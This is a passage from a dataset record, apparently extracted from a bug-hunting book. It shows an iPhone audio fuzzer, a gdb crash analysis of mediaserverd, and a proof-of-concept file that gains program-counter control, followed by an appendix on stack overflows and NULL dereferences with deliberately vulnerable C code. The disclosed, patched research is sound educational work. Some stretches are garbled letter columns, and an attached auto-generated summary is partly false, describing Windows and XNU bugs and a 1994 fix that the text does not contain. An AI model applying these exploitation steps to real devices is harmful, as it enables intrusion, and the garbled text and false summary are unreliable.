]\n19 do\n20 cp ./Alarm.m4r ./file$cnt.m4a\n21 ./fuzz $filesize $off $val ./file$cnt.m4a\n136 Chapter 8\n22 let \"off+=1\"\n23 let \"cnt+=1\"\n24 done\nListing 8-2: The bash script I created to automate file mutation (go.sh)\nThis script, which is just a wrapper for the fuzzer illustrated in List-\ning 8-1, automatically creates four test cases of the target file Alarm.m4r\n(see line 20). Starting at file offset 0 (see line 7), the first 4 bytes of\nthe target file (see line 10) are each replaced with a 0xff (see line 13).\nWhen executed, the script produced the following output:\nlinux$ ./go.sh\n[+] file offset: 0x00000000 (value: 0x000000ff)\n[+] file offset: 0x00000001 (value: 0x000000ff)\n[+] file offset: 0x00000002 (value: 0x000000ff)\n[+] file offset: 0x00000003 (value: 0x000000ff)\nI then verified the created test cases:\nlinux$ xxd file0.m4a | head -1\n0000000: ff00 0020 6674 7970 4d34 4120 0000 0000 ... ftypM4A ....\nlinux$ xxd file1.m4a | head -1\n0000000: 00ff 0020 6674 7970 4d34 4120 0000 0000 ... ftypM4A ....\nlinux$ xxd file2.m4a | head -1\n0000000: 0000 ff20 6674 7970 4d34 4120 0000 0000 ... ftypM4A ....\nlinux$ xxd file3.m4a | head -1\n0000000: 0000 00ff 6674 7970 4d34 4120 0000 0000 ....ftypM4A ....\nAs the output shows, the fuzzer worked as expected and modi-\nfied the appropriate byte in each test-case file. One important fact I\nhaven’t mentioned yet is that the script in Listing 8-2 changes the file\nextension of the alarm ringtone from .m4r to .m4a (see line 20). This\nis necessary because MobileSafari doesn’t support the .m4r file exten-\nsion used by iPhone ringtones.\nI copied the modified and unmodified alarm ringtone files into\nthe web root directory of the Apache webserver that I had installed\non the Linux host. I changed the file extension of the alarm ring-\ntone from .m4r to .m4a and pointed MobileSafari to the URL of the\nunmodified ringtone.\nAs illustrated in Figure 8-1, the unmodified target file Alarm.m4a\nsuccessfully played on the phone in MobileSafari. I then pointed the\nbrowser to the URL of the first modified test-case file, named file0.m4a.\nFigure 8-2 shows that MobileSafari opens the modified file but\nisn’t able to parse it correctly.\nThe Ringtone Massacre 137\nFigure 8-1: Playing the unmodified Figure 8-2: Playing the modified test-case\nAlarm.m4a with MobileSafari file (file0.m4a)\nSo what had I achieved so far? I was able to prepare audio-file\ntest cases via mutation, launch MobileSafari, and instruct it to load\nthe test cases. At this point, I wanted to find a way to automatically\nopen the test-case files in MobileSafari one by one while monitoring\nmediaserverd for faults. I created this small Bash script to do the job on\nthe phone:\n01 #!/bin/bash\n02\n03 fuzzhost=192.168.99.103\n04\n05 echo [+] =================================\n06 echo [+] Start fuzzing\n07 echo [+]\n08 echo -n \"[+] Cleanup: \"\n09 killall MobileSafari\n10 killall mediaserverd\n11 sleep 5\n12 echo\n13\n14 origpid=`ps -u mobile -o pid,command | grep /usr/sbin/mediaserverd | cut -c 0-5`\n15 echo [+] Original PID of /usr/sbin/mediaserverd: $origpid\n16\n17 currpid=$origpid\n18 let cnt=0\n19 let i=0\n20\n21 while [ $cnt -le 1000 ];\n138 Chapter 8\n22 do\n23 if [ $i -eq 10 ];\n24 then\n25 echo -n \"[+] Restarting mediaserverd.. \"\n26 killall mediaserverd\n27 sleep 4\n28 origpid=`ps -u mobile -o pid,command | grep /usr/sbin/ →\nmediaserverd | cut -c 0-5`\n29 currpid=$origpid\n30 sleep 10\n31 echo \"done\"\n32 echo [+] New mediaserverd PID: $origpid\n33 i=0\n34 fi\n35 echo\n36 echo [+] =================================\n37 echo [+] Current file: http://$fuzzhost/file$cnt.m4a\n38 openURL http://$fuzzhost/file$cnt.m4a\n39 sleep 30\n40 currpid=`ps -u mobile -o pid,command | grep /usr/sbin/mediaserverd | →\ncut -c 0-5`\n41 echo [+] Current PID of /usr/sbin/mediaserverd: $currpid\n42 if [ $currpid -ne $origpid ];\n43 then\n44 echo [+] POTENTIAL BUG FOUND! File: file$cnt.m4a\n45 openURL http://$fuzzhost/BUG_FOUND_file$cnt.m4a\n46 origpid=$currpid\n47 sleep 5\n48 fi\n49 ((cnt++))\n50 ((i++))\n51 killall MobileSafari\n52 done\n53\n54 killall MobileSafari\nListing 8-3: Code to automatically open test cases while monitoring mediaserverd for faults (audiofuzzer.sh)\nThe Bash script illustrated in Listing 8-3 works this way:\n• Line 3 displays the IP address of the web server that hosts the test\ncases.\n• Lines 9 and 10 restart mediaserverd and kill all running MobileSafari\ninstances in order to create a clean environment.\n• Line 14 copies the process ID of the mediaserverd audio daemon\ninto the variable origpid.\n• Line 21 contains the main loop that is executed for each test case.\n• Lines 23–34 restart the mediaserverd after every 10 test cases.\nFuzzing the iPhone can be tedious, since some components,\nincluding mediaserverd, are prone to hangs.\n• Line 38 launches the individual test cases hosted on the web\nserver using the openURL tool.6\nThe Ringtone Massacre 139\n• Line 40 copies the current process ID of the mediaserverd audio\ndaemon into the variable currpid.\n• Line 42 compares the saved process ID of mediaserverd (see line 14)\nand the current process ID of the daemon. The two process IDs\ndiffer when mediaserverd has encountered a fault and restarted\nwhile processing one of the test cases. This finding is logged to\nthe phone’s terminal (see line 44). The script will also send a GET\nrequest to the web server that includes the text “BUG_FOUND” as well\nas the name of the file that crashed mediaserverd (see line 45).\n• Line 51 kills the current instance of MobileSafari after each test-\ncase run.\nAfter I implemented this little script, I created 1,000 mutations of\nthe Alarm.m4r ringtone starting at file offset 0, copied them to the web\nroot directory of the web server, and started the audiofuzzer.sh script\non the iPhone. From time to time the phone crashed due to memory\nleaks. Every time that happened, I had to reboot the phone, extract\nthe filename of the last processed test case from the access logfile\nof the web server, adjust line 18 of Listing 8-3, and continue fuzzing.\nFuzzing the iPhone can be such a pain . . . but it was worth it! In addi-\ntion to the memory leaks that froze the phone, I also found a bunch\nof crashes due to memory corruption.\n8.2 Crash Analysis and exploitation\nAfter the fuzzer had finished processing the test cases, I searched the\naccess logfile of the web server for “BUG_FOUND” entries.\nlinux$ grep BUG /var/log/apache2/access.log\n192.168.99.103 .. \"GET /BUG_FOUND_file40.m4a HTTP/1.1\" 404 277 \"-\" \"Mozilla/5.0\n(iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML,\nlike Gecko) Version/3.1.1 Mobile/5H11 Safari/525.20\"\n192.168.99.103 .. \"GET /BUG_FOUND_file41.m4a HTTP/1.1\" 404 276 \"-\" \"Mozilla/5.0\n(iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML,\nlike Gecko) Version/3.1.1 Mobile/5H11 Safari/525.20\"\n192.168.99.103 .. \"GET /BUG_FOUND_file42.m4a HTTP/1.1\" 404 277 \"-\" \"Mozilla/5.0\n(iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML,\nlike Gecko) Version/3.1.1 Mobile/5H11 Safari/525.20\"\n[..]\nm a\na t g h\ne t\nn e\nt d\ne r d\ne i m\np (\na A\n4 s\ns\nh 2\ns p\ne\ne\no . e\nr t s i\nn\nh v\nT\nn\nS\ne\ne\no\no\ng\ne\nr w\nc\nd\na a\nt\nt\nn\nn\no\nn\ne\nio d\nn\na\ni p n\nn l\nc\na\nl\ny\na o\nt z\nt\nB t\ny h u\ne a . 4\ne t n\nc t\nh\n) h h\nt e e e\ne e t\nx r\no d\nt c\nc\ne e e\nm r\nd s\nt\nr\ne a h\nt p\nd\n-\ns\na c\ne i h\nt a\na\nf\ne G\no a s\ns s\ne f u\ne N , r\nt l fi\nI U v\nt h l\ne r\nw e e\nr e d\ns h\nd\nl\nb e\no\n:\n4 i\no b\nl g 0 e\no u\nfi ,\nt g\nl 4\ne\ne\n-\n1\nd\n, ,\nf l b r\nC\na\nm ←\ne o n\nP\nc m\no\ng\nU\na\nT b\nu u\n. i h\na I\nl\ns n\nT e e\ng e t\nh\ne\nd i\ne t\ni P s e\nl h i s\nh v\ne a\ni o i s\nv s\nc\nA\nn\ns a\ne i\ne\nm e\ns R\ns\nm t\n, ,\nM\np\nly\nl u\nb\ni o k s\nl\nr\na d y\ne e t\ns\ns\n. i s\na\nf\nm\nf e\na n\ne m\nn o t\nr\ns\ne b\nA t\nn l y\nR\nt\nM\n140 Chapter 8\niphone# uname -a\nDarwin localhost 9.4.1 Darwin Kernel Version 9.4.1: Mon Dec 8 20:59:30 PST 2008;\nroot:xnu-1228.7.37~4/RELEASE_ARM_S5L8900X iPhone1,1 arm M68AP Darwin\niphone# id\nuid=0(root) gid=0(wheel)\niphone# gdb -q\nAfter I started gdb, I used the following command to retrieve the\ncurrent process ID of mediaserverd:\n(gdb) shell ps -u mobile -O pid | grep mediaserverd\n27 ?? Ss 0:01.63 /usr/sbin/mediaserverd\nI then loaded the mediaserverd binary into the debugger and\nattached it to the process:\n(gdb) exec-file /usr/sbin/mediaserverd\nReading symbols for shared libraries ......... done\n(gdb) attach 27\nAttaching to program: `/usr/sbin/mediaserverd', process 27.\nReading symbols for shared libraries ..................................... done\n0x3146baa4 in mach_msg_trap ()\nBefore I continued the execution of mediaserverd, I used the\nfollow-fork-mode command to instruct the debugger to follow the\nchild process instead of the parent process:\n(gdb) set follow-fork-mode child\n(gdb) continue\nContinuing.\nI opened MobileSafari on the phone and pointed it to the URL\nof test-case file number 40 (file40.m4a). The debugger produced the\nfollowing result:\nProgram received signal EXC_BAD_ACCESS, Could not access memory.\nReason: KERN_PROTECTION_FAILURE at address: 0x01302000\n[Switching to process 27 thread 0xa10b]\n0x314780ec in memmove ()\nThe crash occurred when mediaserverd tried to access memory at\naddress 0x01302000.\n(gdb) x/1x 0x01302000\n0x1302000: Cannot access memory at address 0x1302000\nThe Ringtone Massacre 141\nAs the debugger output shows, mediaserverd crashed while trying\nto reference an unmapped memory location. To further analyze the\ncrash, I printed the current call stack:\n(gdb) backtrace\n#0 0x314780ec in memmove ()\n#1 0x3493d5e0 in MP4AudioStream::ParseHeader ()\n#2 0x00000072 in ?? ()\nCannot access memory at address 0x72\nThis output was intriguing. The address of stack frame #2 had an\nunusual value (0x00000072), which seemed to indicate that the stack\nhad become corrupted. I used the following command to print the\nlast instruction that was executed in MP4AudioStream::ParseHeader() (see\nstack frame #1):\n(gdb) x/1i 0x3493d5e0 - 4\n0x3493d5dc <_ZN14MP4AudioStream11ParseHeaderER27AudioFileStreamContinuation+1652>:\nbl 0x34997374 <dyld_stub_memcpy>\nThe last instruction executed in MP4AudioStream::ParseHeader() was\na call to memcpy(), which must have caused the crash. At this time, the\nbug had exhibited all the characteristics of a stack buffer overflow\nvulnerability (see Section A.1).\nI stopped the debugging session and rebooted the device.\nAfter the phone started, I attached the debugger to mediaserverd\nagain, and this time I also defined a breakpoint at the memcpy() call\nin MP4AudioStream::ParseHeader() in order to evaluate the function\narguments supplied to memcpy():\n(gdb) break *0x3493d5dc\nBreakpoint 1 at 0x3493d5dc\n(gdb) continue\nContinuing.\nI opened test case number 40 (file40.m4a) in MobileSafari in\norder to trigger the breakpoint:\n[Switching to process 27 thread 0x9c0b]\nBreakpoint 1, 0x3493d5dc in MP4AudioStream::ParseHeader ()\nThe arguments of memcpy() are usually stored in the registers r0\n(destination buffer), r1 (source buffer), and r2 (bytes to copy). I asked\nthe debugger for the current values of those registers.\n142 Chapter 8\n(gdb) info registers r0 r1 r2\nr0 0x684a38 6834744\nr1 0x115030 1134640\nr2 0x1fd0 8144\nI also inspected the data pointed to by r1 to see if the source data\nof memcpy() was user controllable:\n(gdb) x/40x $r1\n0x115030: 0x00000000 0xd7e178c2 0xe5e178c2 0x80bb0000\n0x115040: 0x00b41000 0x00000100 0x00000001 0x00000000\n0x115050: 0x00000000 0x00000100 0x00000000 0x00000000\n0x115060: 0x00000000 0x00000100 0x00000000 0x00000000\n0x115070: 0x00000000 0x00000040 0x00000000 0x00000000\n0x115080: 0x00000000 0x00000000 0x00000000 0x00000000\n0x115090: 0x02000000 0x2d130000 0x6b617274 0x5c000000\n0x1150a0: 0x64686b74 0x07000000 0xd7e178c2 0xe5e178c2\n0x1150b0: 0x01000000 0x00000000 0x00b41000 0x00000000\n0x1150c0: 0x00000000 0x00000000 0x00000001 0x00000100\nI then searched test-case file number 40 for those values. I found\nthem right at the beginning of the file in little-endian notation:\n[..]\n00000030h: 00 00 00 00 C2 78 E1 D7 C2 78 E1 E5 00 00 BB 80 ; ....Âxá×Âxáå..»€\n00000040h: 00 10 B4 00 00 01 00 00 01 00 00 00 00 00 00 00 ; ..´.............\n00000050h: 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 ; ................\n00000060h: 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 ; ................\n00000070h: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 ; ....@...........\n[..]\nSo I could control the source data of the memory copy. I contin-\nued the execution of mediaserverd and got the following output in the\ndebugger:\n(gdb) continue\nContinuing.\nProgram received signal EXC_BAD_ACCESS, Could not access memory.\nReason: KERN_PROTECTION_FAILURE at address: 0x00685000\n0x314780ec in memmove ()\nMediaserverd crashed again while trying to access unmapped mem-\nory. It seemed that the size argument supplied to memcpy() was too big,\nso the function tried to copy audio-file data beyond the end of the\nstack. At this point I stopped the debugger and opened the test-case\nfile that had actually caused the crash (file40.m4a) with a hex editor:\n00000000h: 00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00 ; ... ftypM4A ....\n00000010h: 4D 34 41 20 6D 70 34 32 69 73 6F 6D 00 00 00 00 ; M4A mp42isom....\n00000020h: 00 00 1C 65 6D 6F 6F 76 FF 00 00 6C 6D 76 68 64 ; ...emoovÿ..lmvhd\n[..]\nThe Ringtone Massacre 143\nThe manipulated byte (0xff) that caused the crash can be found\nat file offset 40 (0x28). I consulted the QuickTime File Format Specifica-\ntion7 to determine the role of that byte within the file structure. The\nbyte was described as part of the atom size of a movie header atom, so\nthe fuzzer must have changed the size value of that atom. As I men-\ntioned before, the size supplied to memcpy() was too big, so mediaserverd\nhad crashed while trying to copy too much data onto the stack. To\navoid the crash, I set the atom size to a smaller value. I changed the\nmanipulated value at file offset 40 back to 0x00 and the byte value at\noffset 42 to 0x02. I named the new file file40_2.m4a.\nHere is the original test-case file 40 (file40.m4a):\n00000020h: 00 00 1C 65 6D 6F 6F 76 FF 00 00 6C 6D 76 68 64 ; ...emoovÿ..lmvhd\nAnd here is the new test-case file (file40_2.m4a) with changes\nunderlined:\n00000020h: 00 00 1C 65 6D 6F 6F 76 00 00 02 6C 6D 76 68 64 ; ...emoovÿ..lmvhd\nI rebooted the device to get a clean environment, attached\nthe debugger to mediaserverd again, and opened the new file in\nMobileSafari.\nProgram received signal EXC_BAD_ACCESS, Could not access memory.\nReason: KERN_PROTECTION_FAILURE at address: 0x00000072\n[Switching to process 27 thread 0xa10b]\n0x00000072 in ?? ()\nThis time the program counter (instruction pointer) was manipu-\nlated to point to address 0x00000072. I then stopped the debugging\nsession and started a new one while again setting a breakpoint at the\nmemcpy() call in MP4AudioStream::ParseHeader():\n(gdb) break *0x3493d5dc\nBreakpoint 1 at 0x3493d5dc\n(gdb) continue\nContinuing.\nWhen I opened the modified test-case file file40_2.m4a in Mobile-\nSafari, I got the following output in the debugger:\n[Switching to process 71 thread 0x9f07]\nBreakpoint 1, 0x3493d5dc in MP4AudioStream::ParseHeader ()\n144 Chapter 8\nI printed the current call stack:\n(gdb) backtrace\n#0 0x3493d5dc in MP4AudioStream::ParseHeader ()\n#1 0x3490d748 in AudioFileStreamWrapper::ParseBytes ()\n#2 0x3490cfa8 in AudioFileStreamParseBytes ()\n#3 0x345dad70 in PushBytesThroughParser ()\n#4 0x345dbd3c in FigAudioFileStreamFormatReaderCreateFromStream ()\n#5 0x345dff08 in instantiateFormatReader ()\n#6 0x345e02c4 in FigFormatReaderCreateForStream ()\n#7 0x345d293c in itemfig_assureBasicsReadyForInspectionInternal ()\n#8 0x345d945c in itemfig_makeReadyForInspectionThread ()\n#9 0x3146178c in _pthread_body ()\n#10 0x00000000 in ?? ()\nThe first stack frame on the list was the one I was looking for. I\nused the following command to display information about the current\nstack frame of MP4AudioStream::ParseHeader():\n(gdb) info frame 0\nStack frame at 0x1301c00:\npc = 0x3493d5dc in MP4AudioStream::ParseHeader(AudioFileStreamContinuation&); saved\npc 0x3490d748\ncalled by frame at 0x1301c30\nArglist at 0x1301bf8, args:\nLocals at 0x1301bf8, Saved registers:\nr4 at 0x1301bec, r5 at 0x1301bf0, r6 at 0x1301bf4, r7 at 0x1301bf8, r8 at →\n0x1301be0, sl at 0x1301be4, fp at 0x1301be8, lr at 0x1301bfc, pc at 0x1301bfc,\ns16 at 0x1301ba0, s17 at 0x1301ba4, s18 at 0x1301ba8, s19 at 0x1301bac, s20 at →\n0x1301bb0, s21 at 0x1301bb4, s22 at 0x1301bb8, s23 at 0x1301bbc,\ns24 at 0x1301bc0, s25 at 0x1301bc4, s26 at 0x1301bc8, s27 at 0x1301bcc, s28 at →\n0x1301bd0, s29 at 0x1301bd4, s30 at 0x1301bd8, s31 at 0x1301bdc\nThe most interesting information was the memory location\nwhere the program counter (pc register) was stored on the stack. As\nthe debugger output shows, pc was saved at address 0x1301bfc on the\nstack (see “Saved registers”).\nI then continued the execution of the process:\n(gdb) continue\nContinuing.\nProgram received signal EXC_BAD_ACCESS, Could not access memory.\nReason: KERN_PROTECTION_FAILURE at address: 0x00000072\n0x00000072 in ?? ()\nAfter the crash, I looked at the stack location (memory address\n0x1301bfc) where the MP4AudioStream::ParseHeader() function expects to\nfind its saved program counter.\nThe Ringtone Massacre 145\n(gdb) x/12x 0x1301bfc\n0x1301bfc: 0x00000073 0x00000000 0x04000001 0x0400002d\n0x1301c0c: 0x00000000 0x73747328 0x00000063 0x00000000\n0x1301c1c: 0x00000002 0x00000001 0x00000017 0x00000001\nThe debugger output shows that the saved instruction pointer\nwas overwritten with the value 0x00000073. When the function tried to\nreturn to its caller function, the manipulated value was assigned to the\ninstruction pointer (pc register). Specifically, the value 0x00000072 was\ncopied into the instruction pointer instead of the file value 0x00000073\ndue to the instruction alignment of the ARM CPU (instruction align-\nment on a 16-bit or 32-bit boundary).\nMy extremely simple fuzzer had indeed found a classic stack buf-\nfer overflow in the audio libraries of the iPhone. I searched the test-\ncase file for the byte pattern of the debugger output and found the\nbyte sequence at file offset 500 in file40_2.m4a:\n000001f0h: 18 73 74 74 73 00 00 00 00 00 00 00 01 00 00 04 ; .stts...........\n00000200h: 2D 00 00 04 00 00 00 00 28 73 74 73 63 00 00 00 ; -.......(stsc...\n00000210h: 00 00 00 00 02 00 00 00 01 00 00 00 17 00 00 00 ; ................\nI then changed the underlined value above to 0x44444444 and\nnamed the new file poc.m4a:\n000001f0h: 18 73 74 74 44 44 44 44 00 00 00 00 01 00 00 04 ; .sttDDDD.........\n00000200h: 2D 00 00 04 00 00 00 00 28 73 74 73 63 00 00 00 ; -.......(stsc...\n00000210h: 00 00 00 00 02 00 00 00 01 00 00 00 17 00 00 00 ; ................\nI attached the debugger to mediaserverd again and opened the new\npoc.m4a file in MobileSafari, which resulted in the following debugger\noutput:\nProgram received signal EXC_BAD_ACCESS, Could not access memory.\nReason: KERN_INVALID_ADDRESS at address: 0x44444444\n[Switching to process 77 thread 0xa20f]\n0x44444444 in ?? ()\n(gdb) info registers\nr0 0x6474613f 1685348671\nr1 0x393fc284 960479876\nr2 0xcb0 3248\nr3 0x10b 267\nr4 0x6901102 110104834\nr5 0x1808080 25198720\nr6 0x2 2\nr7 0x74747318 1953788696\nr8 0xf40100 15991040\nr9 0x817a00 8485376\n146 Chapter 8\nsl 0xf40100 15991040\nfp 0x80808005 -2139062267\nip 0x20044 131140\nsp 0x684c00 6835200\nlr 0x1f310 127760\npc 0x44444444 1145324612\ncpsr {0x60000010, n = 0x0, z = 0x1, c = 0x1, v = 0x0, q = 0x0, j = 0x0, ge\n= 0x0, e = 0x0, a = 0x0, i = 0x0, f = 0x0, t = 0x0, mode = 0x10} {0x60000010, n\n= 0, z = 1, c = 1, v = 0, q = 0, j = 0, ge = 0, e = 0, a = 0, i = 0, f = 0, t = 0,\nmode = usr}\n(gdb) backtrace\n#0 0x44444444 in ?? ()\nCannot access memory at address 0x74747318\nYay! At this point I had full control over the program counter.\n8.3 Vulnerability remediation\nTuesday, february 2, 2010\nI informed Apple of the bug on October 4, 2009.\nToday they released a new version of iPhone OS ← The vulnerability\nto address the vulnerability. affects the iPhone as\nThe bug was easy to find, so I’m sure that I well as the iPod touch\nwasn’t the only person who knew about it, but I with iPhone OS prior\nseem to be the only one who informed Apple.\nversion 3.1.3.\nMore surprising: Apple didn’t find such a trivial\nbug on its own.\n8.4 lessons learned\nAs a bug hunter and iPhone user:\n• Even dumb mutation-based fuzzers, like the one described in this\nchapter, can be quite effective.\n• Fuzzing the iPhone is tedious but worth it.\n• Do not open untrusted (media) files on your iPhone.\n8.5 Addendum\nTuesday, february 2, 2010\nSince the vulnerability has been fixed and a new version of iPhone\nOS is available, I released a detailed security advisory on my website\ntoday.8 The bug was assigned CVE-2010-0036. Figure 8-3 shows a time-\nline of how the vulnerability was addressed.\nThe Ringtone Massacre 147\nApple confirms\nthe vulnerability Release date of my\nsecurity advisory\nApple New iPhone OS\nnotified released by Apple\n10.04.2009 10.15.2009 02.02.2010\nFigure 8-3: Timeline from the time I notified Apple until I released a security advisory\nnotes\n1. See http://en.wikipedia.org/wiki/IOS_jailbreaking.\n2. See http://cydia.saurik.com/.\n3. See “iOS Developer Library: Core Audio Overview” at http://developer.apple\n.com/library/ios/#documentation/MusicAudio/Conceptual/CoreAudioOverview/\nIntroduction/Introduction.html.\n4. See “iOS Developer Library: Audio Toolbox Framework Reference” at\nhttp://developer.apple.com/library/ios/#documentation/MusicAudio/Reference/\nCAAudioTooboxRef/_index.html.\n5. See http://en.wikipedia.org/wiki/Advanced_Audio_Coding.\n6. See http://ericasadun.com/ftp/EricaUtilities/.\n7. The QuickTime File Format Specification is available at http://developer\n.apple.com/mac/library/documentation/QuickTime/QTFF/QTFFPreface/qtffPreface\n.html.\n8. My security advisory that describes the details of the iPhone vulnerability\ncan be found at http://www.trapkit.de/advisories/TKADV2010-002.txt.\n148 Chapter 8",
    "question": "What is the key concept discussed in the text regarding the vulnerability in the XNU kernel of OS X and how was it exploited?",
    "summary": "The author discovered two vulnerabilities: one in the Windows kernel allowing privilege escalation, and another in the XNU kernel of macOS, which was already fixed in 1994. Both vulnerabilities involved improper handling of user input, leading to potential code execution. The author developed exploits to demonstrate the vulnerabilities but avoided providing full working exploits due to legal restrictions. They also released security advisories and detailed the fix for the macOS vulnerability by adding a check for negative values in the IOCTL processing. For the iPhone vulnerability, the author found a stack buffer overflow in the audio libraries, which was later fixed by Apple. The author emphasized the importance of input validation and secure coding practices."
  },
  {
    "start": 63,
    "end": 68,
    "text": "A\nHints for Hunting\nThis appendix describes, in more depth than in the text, some vulner-\nability classes, exploitation techniques, and common issues that can\nlead to bugs.\nA.1 stack Buffer overflows\nBuffer overflows are memory corruption vulnerabilities that can be\ncategorized by type (also known as generation). Today the most relevant\nones are stack buffer overflows and heap buffer overflows. A buffer overflow\nhappens if more data is copied into a buffer or array than the buffer\nor array can handle. It’s that simple. As the name implies, stack buffer\noverflows are happening in the stack area of a process memory. The\nstack is a special memory area of a process that holds both data and\nmetadata associated with procedure invocation. If more data is stuffed\nin a buffer declared on the stack than that buffer can handle, adjacent\nstack memory may be overwritten. If the user can control the data and\nthe amount of data, it is possible to manipulate the stack data or meta-\ndata to gain control of the execution flow of the process.\np r o ← e l f a l a t s T f t t o h a e r d c e m k f t o o b ( l u l I o t A f h w f - e e i 3 r n 3 2 g o 2 ) v . d - e e r b s fl i c t o r w I i n p s t t e i a o l r n e s\nEvery function of a process that is executed is represented on the\nstack. The organization of this information is called a stack frame. A\nstack frame includes the data and metadata of the function, as well as\na return address used to find the caller of the function. When a func-\ntion returns to its caller, the return address is popped from the stack\nand into the instruction pointer (program counter) register. If you\ncan overflow a stack buffer and then overwrite the return address with\na value of your choosing, you get control over the instruction pointer\nwhen the function returns.\nThere are a lot of other possible ways to take advantage of a stack\nbuffer overflow for example, by manipulating function pointers, func-\ntion arguments, or other important data and metadata on the stack.\nLet’s look at an example program:\n01 #include <string.h>\n02\n03 void\n04 overflow (char *arg)\n05 {\n06 char buf[12];\n07\n08 strcpy (buf, arg);\n09 }\n10\n11 int\n12 main (int argc, char *argv[])\n13 {\n14 if (argc > 1)\n15 overflow (argv[1]);\n16\n17 return 0;\n18 }\nListing A-1: Example program stackoverflow.c\nThe example program in Listing A-1 contains a simple stack buf-\nfer overflow. The first command-line argument (line 15) is used as a\nparameter for the function called overflow(). In overflow(), the user-\nderived data is copied into a stack buffer with a fixed size of 12 bytes\n(see lines 6 and 8). If we supply more data than the buffer can hold\n(more than 12 bytes), the stack buffer will overflow, and the adjacent\nstack data will be overwritten with our input data.\nFigure A-1 illustrates the stack layout right before and after the\nbuffer overflow. The stack grows downward (toward lower memory\naddresses), and the return address (RET) is followed by another piece\nof metadata called the saved frame pointer (SFP). Below that is the buf-\nfer that is declared in the overflow() function. In contrast to the stack,\nwhich grows downward, the data that is filled into a stack buffer grows\ntoward higher memory addresses. If we supply a sufficient amount of\ndata for the first command-line argument, then our data will overwrite\n150 Appendix A\nthe buffer, the SFP, the RET, and adjacent stack memory. If the func-\ntion then returns, we control the value of RET, which gives us control\nover the instruction pointer (EIP register).\nStack before Stack after\nthe overflow the overflow\nsaved return address EIP control\nRET RET\nSFP SFP\nother\nstack frame\nmetadata\nof overflow() buf buf\nuser-controlled\ninput data\nlower addresses\nFigure A-1: Stack frame illustrating a buffer overflow\nExample: Stack Buffer Overflow Under Linux\nTo test the program from Listing A-1 under Linux (Ubuntu 9.04), I\ncompiled it without stack canary support (see Section C.1):\nlinux$ gcc -fno-stack-protector -o stackoverflow stackoverflow.c\nThen, I started the program in the debugger (see Section B.4 for\nmore information about gdb) while supplying 20 bytes of user input\nas a command-line argument (12 bytes to fill the stack buffer plus\n4 bytes for the SFP plus 4 bytes for the RET):\nlinux$ gdb -q ./stackoverflow\n(gdb) run $(perl -e 'print \"A\"x12 . \"B\"x4 . \"C\"x4')\nStarting program: /home/tk/BHD/stackoverflow $(perl -e 'print \"A\"x12 . \"B\"x4 .\n\"C\"x4')\nProgram received signal SIGSEGV, Segmentation fault.\n0x43434343 in ?? ()\n(gdb) info registers\neax 0xbfab9fac -1079271508\necx 0xbfab9fab -1079271509\nedx 0x15 21\nebx 0xb8088ff4 -1207398412\nesp 0xbfab9fc0 0xbfab9fc0\nebp 0x42424242 0x42424242\nesi 0x8048430 134513712\nedi 0x8048310 134513424\nHints for Hunting 151\neip 0x43434343 0x43434343\neflags 0x10246 [ PF ZF IF RF ]\ncs 0x73 115\nss 0x7b 123\nds 0x7b 123\nes 0x7b 123\nfs 0x0 0\ngs 0x33 51\nI gained control over the instruction pointer (see the EIP regis-\nter), as the return address was successfully overwritten with the four\nCs supplied from the user input (hexadecimal value of the four Cs:\n0x43434343).\nExample: Stack Buffer Overflow Under Windows\nI compiled the vulnerable program from Listing A-1 without security\ncookie (/GS) support under Windows Vista SP2 (see Section C.1):\nC:\\Users\\tk\\BHD>cl /nologo /GS- stackoverflow.c\nstackoverflow.c\nThen, I started the program in the debugger (see Section B.2 for\nmore information about WinDbg) while supplying the same input\ndata as in the Linux example above.\nAs Figure A-2 shows, I got the same result as under Linux: control\nover the instruction pointer (see the EIP register).\nFigure A-2: Stack buffer overflow under Windows (WinDbg output)\n152 Appendix A\nThis was only a short introduction to the world of buffer over-\nflows. Numerous books and white papers are available on this topic. If\nyou want to learn more, I recommend Jon Erickson’s Hacking: The Art\nof Exploitation, 2nd edition (No Starch Press, 2008), or you can type\nbuffer overflows into Google and browse the enormous amount of mate-\nrial available online.\nA.2 null pointer Dereferences\nMemory is divided into pages. Typically, a process, a thread, or the\nkernel cannot read from or write to a memory location on the zero\npage. Listing A-2 shows a simple example of what happens if the zero\npage gets referenced due to a programming error.\n01 #include <stdio.h>\n02\n03 typedef struct pkt {\n04 char * value;\n05 } pkt_t;\n06\n07 int\n08 main (void)\n09 {\n10 pkt_t * packet = NULL;\n11\n12 printf (\"%s\", packet->value);\n13\n14 return 0;\n15 }\nListing A-2: Using unowned memory—an example NULL pointer dereference\nIn line 10 of Listing A-2 the data structure packet is initialized with\nNULL, and in line 12 a structure member gets referenced. Since packet\npoints to NULL, this reference can be represented as NULL->value. This\nleads to a classic NULL pointer dereference when the program tries to\nread a value from memory page zero. If you compile this program\nunder Microsoft Windows and start it in the Windows Debugger\nWinDbg (see Section B.2), you get the following result:\n[..]\n(1334.12dc): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=7713b68f ecx=00000001 edx=77c55e74 esi=00000002 edi=00001772\neip=0040100e esp=0012ff34 ebp=0012ff38 iopl=0 nv up ei pl zr na pe nc\ncs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246\n*** WARNING: Unable to verify checksum for image00400000\n*** ERROR: Module load completed but symbols could not be loaded for image00400000\nimage00400000+0x100e:\n0040100e 8b08 mov ecx,dword ptr [eax] ds:0023:00000000=????????\n[..]\nHints for Hunting 153\nThe access violation is caused when the value of EAX, which is\n0x00000000, gets referenced. You can get more information on the\ncause of the crash by using the debugger command !analyze -v:\n0:000> !analyze -v\n[..]\nFAULTING_IP:\nimage00400000+100e\n0040100e 8b08 mov ecx,dword ptr [eax]\nEXCEPTION_RECORD: ffffffff -- (.exr 0xffffffffffffffff)\nExceptionAddress: 0040100e (image00400000+0x0000100e)\nExceptionCode: c0000005 (Access violation)\nExceptionFlags: 00000000\nNumberParameters: 2\nParameter[0]: 00000000\nParameter[1]: 00000000\nAttempt to read from address 00000000\n[..]\nNULL pointer dereferences 